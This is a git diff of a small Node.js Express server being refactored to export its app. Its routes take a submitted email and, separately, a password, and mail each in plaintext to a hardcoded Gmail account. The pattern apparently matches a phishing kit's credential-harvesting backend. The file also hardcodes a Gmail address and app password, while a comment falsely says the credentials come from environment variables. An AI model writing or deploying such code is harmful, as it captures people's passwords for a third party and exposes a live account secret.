@@ -1,24 +1,19 @@
-const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT
-
-const app = express(); // app is use for link express functions
+const express = require("express");
 const cors = require("cors");
-const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email
+const nodemailer = require("nodemailer");
+require("dotenv").config(); // Load environment variables
+
+const app = express();
 
 app.use(express.json());
 app.use(cors());
 
-const PORT = process.env.PORT || 5000; // port to connect to WEB
-
+// Email credentials from environment variables
 // emails credentials
 const userEmail = "Igbovitalis269@gmail.com";
 const pass = "mjfpjwwtwqkepvdp";
 
-// Middleware
-app.use(express.json());
-
-// api routes
-
-// API routes for index
+// API route for index
 app.post("/", (req, res) => {
   const { email } = req.body;
 
@@ -37,19 +32,18 @@ app.post("/", (req, res) => {
     text: `New user registered with Email: ${email}`,
   };
 
-  console.log(mailOptions);
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.log(error);
-      res.send("error Occured: " + error);
+      res.status(500).send("Error occurred: " + error);
     } else {
-      console.log("Email sent", +info.response);
-      res.send("success");
+      console.log("Email sent:", info.response);
+      res.send("Success");
     }
   });
 });
 
-// API routes for password
+// API route for password
 app.post("/pass", (req, res) => {
   const { password } = req.body;
 
@@ -68,18 +62,16 @@ app.post("/pass", (req, res) => {
     text: `New user registered with Password: ${password}`,
   };
 
-  console.log(mailOptions);
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.log(error);
-      res.send("error Occured: " + error);
+      res.status(500).send("Error occurred: " + error);
     } else {
-      console.log("Email sent", +info.response);
-      res.send("success");
+      console.log("Email sent:", info.response);
+      res.send("Success");
     }
   });
 });
 
-app.listen(PORT, () => {
-  console.log(`Server is running on port http://localhost:${PORT}`);
-});
+// ❌ REMOVE `app.listen(PORT)` and EXPORT `app`
+module.exports = app;
